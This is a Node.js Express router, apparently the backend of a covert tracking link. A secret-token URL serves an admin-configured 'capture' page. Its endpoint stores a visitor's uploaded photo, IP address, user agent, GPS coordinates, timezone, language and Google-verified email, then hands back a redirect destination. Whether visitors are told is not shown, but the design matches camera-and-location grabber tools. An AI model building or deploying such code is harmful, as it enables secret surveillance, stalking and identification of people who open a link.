const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const express = require('express');

const { db, getSetting, UPLOADS_DIR } = require('../db');

const router = express.Router();

function serveCaptureHtml(req, res) {
  const token = getSetting('entry_token');
  if (!token || req.params.token !== token) {
    return res.status(404).send('Not found');
  }
  let html = getSetting('capture_html') || '';
  if (!html) {
    html = fs.readFileSync(path.join(__dirname, '..', 'public', 'capture.html'), 'utf8');
  }
  const config = JSON.stringify({
    mode: getSetting('capture_mode') || 'normal',
    client_id: getSetting('google_client_id') || '',
  }).replace(/</g, '\\u003c');
  const script = '<script>window.__GOOGLE_CONFIG__=' + config + ';</script>';
  if (html.includes('<head')) {
    html = html.replace('<head>', '<head>' + script);
  } else {
    html = script + html;
  }
  res.type('html').send(html);
}

router.get('/r/:token', serveCaptureHtml);

const googleVerifyTokens = new Map();

function consumeVerifyToken(email, token) {
  const entry = googleVerifyTokens.get(email);
  if (!entry || entry.token !== token || entry.exp < Date.now()) {
    return false;
  }
  googleVerifyTokens.delete(email);
  return true;
}

router.post('/api/google-login', async (req, res) => {
  const { credential } = req.body || {};
  const clientId = getSetting('google_client_id') || '';
  if (!credential || typeof credential !== 'string' || credential.length > 50000) {
    return res.status(400).json({ error: 'Credencial inválida' });
  }
  if (getSetting('capture_mode') !== 'google' || !clientId) {
    return res.status(403).json({ error: 'Login de Google no habilitado' });
  }
  try {
    const r = await fetch(
      'https://oauth2.googleapis.com/tokeninfo?id_token=' + encodeURIComponent(credential),
      { signal: AbortSignal.timeout(8000) }
    );
    if (!r.ok) {
      return res.status(401).json({ error: 'No se pudo verificar la credencial' });
    }
    const info = await r.json();
    if (info.aud !== clientId || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(info.email || '')) {
      return res.status(401).json({ error: 'Credencial no válida' });
    }
    const email = info.email.toLowerCase();
    const verifyToken = crypto.randomBytes(16).toString('hex');
    googleVerifyTokens.set(email, { token: verifyToken, exp: Date.now() + 5 * 60 * 1000 });
    res.json({ ok: true, email, verify_token: verifyToken });
  } catch (e) {
    res.status(502).json({ error: 'Error verificando con Google' });
  }
});

const hits = new Map();

function rateLimit(ip) {
  const now = Date.now();
  const recent = (hits.get(ip) || []).filter((t) => now - t < 60000);
  if (recent.length >= 5) return false;
  recent.push(now);
  hits.set(ip, recent);
  return true;
}

const IMAGE_MAGIC = [
  { bytes: [0xff, 0xd8, 0xff], ext: '.jpg' },
  { bytes: [0x89, 0x50, 0x4e, 0x47], ext: '.png' },
  { bytes: [0x52, 0x49, 0x46, 0x46], ext: '.webp' },
];

function imageExt(buf) {
  for (const { bytes, ext } of IMAGE_MAGIC) {
    if (buf.length >= bytes.length && bytes.every((b, i) => buf[i] === b)) return ext;
  }
  return null;
}

router.post('/api/capture', (req, res) => {
  if (!rateLimit(req.ip)) {
    return res.status(429).json({ error: 'Too many requests' });
  }

  const { photo, referrer, lat, lng, tz, lang, email, verify_token } = req.body || {};

  let storedEmail = null;
  if (typeof email === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim())) {
    const candidate = email.trim().toLowerCase().slice(0, 254);
    if (typeof verify_token === 'string' && consumeVerifyToken(candidate, verify_token)) {
      storedEmail = candidate;
    }
  }

  let filename = null;
  if (photo && typeof photo === 'string' && photo.length < 3000000) {
    try {
      const img = Buffer.from(photo.split(',')[1] || '', 'base64');
      const ext = imageExt(img);
      if (img.length > 0 && ext) {
        filename = `cap_${Date.now()}_${crypto.randomBytes(4).toString('hex')}${ext}`;
        fs.writeFileSync(path.join(UPLOADS_DIR, filename), img);
      }
    } catch (e) {
      filename = null;
    }
  }

  db.prepare(
    `INSERT INTO captures (filename, ip, user_agent, referrer, lat, lng, tz, lang, email)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`
  ).run(
    filename,
    req.ip,
    req.headers['user-agent'] || null,
    typeof referrer === 'string' ? referrer.slice(0, 2048) : null,
    Number.isFinite(lat) ? lat : null,
    Number.isFinite(lng) ? lng : null,
    typeof tz === 'string' ? tz.slice(0, 128) : null,
    typeof lang === 'string' ? lang.slice(0, 64) : null,
    storedEmail
  );

  res.json({ destinationUrl: getSetting('destination_url') || '/' });
});

module.exports = router;
